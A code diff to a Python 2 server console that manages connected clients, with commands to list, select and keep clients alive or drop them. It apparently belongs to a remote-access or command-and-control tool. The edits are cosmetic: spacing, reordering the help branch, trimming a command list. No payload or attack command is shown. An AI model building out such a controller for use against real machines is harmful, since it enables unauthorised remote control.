@@ -71,7 +71,7 @@ class Server(threading.Thread):
 
     def get_clients(self):
         # order is not retained. maybe use SortedDict here
-        return [v for _,v in self.clients.iteritems() if v.alive]
+        return [v for _, v in self.clients.iteritems() if v.alive]
 
     def remove_client(self, key):
         return self.clients.pop(key, None)
@@ -170,10 +170,7 @@ def main():
             print 'Invalid command, type "help" to see a list of commands.'
             continue
 
-        # display help text
-        if cmd == 'help':
-            print HELP_TEXT
-
+        # stop the server and keey clients alive
         elif cmd == 'goodbye':
             if raw_input('Stop the server and keep clients alive ' \
                          '(y/N)? ').startswith('y'):
@@ -186,6 +183,10 @@ def main():
                          'connections (y/N)? ').startswith('y'):
                 server.quit()
                 sys.exit(0)
+
+        # display help text
+        if cmd == 'help':
+            print HELP_TEXT
 
         # select client
         elif cmd == 'client':
@@ -203,7 +204,7 @@ def main():
                 print '{:>2} - {}'.format(k.uid, k.addr[0])
 
         # continue loop for above commands
-        if cmd in ['client', 'clients', 'help', 'quit']:
+        if cmd in ['help', 'client', 'clients']:
             continue
 
         # require client id
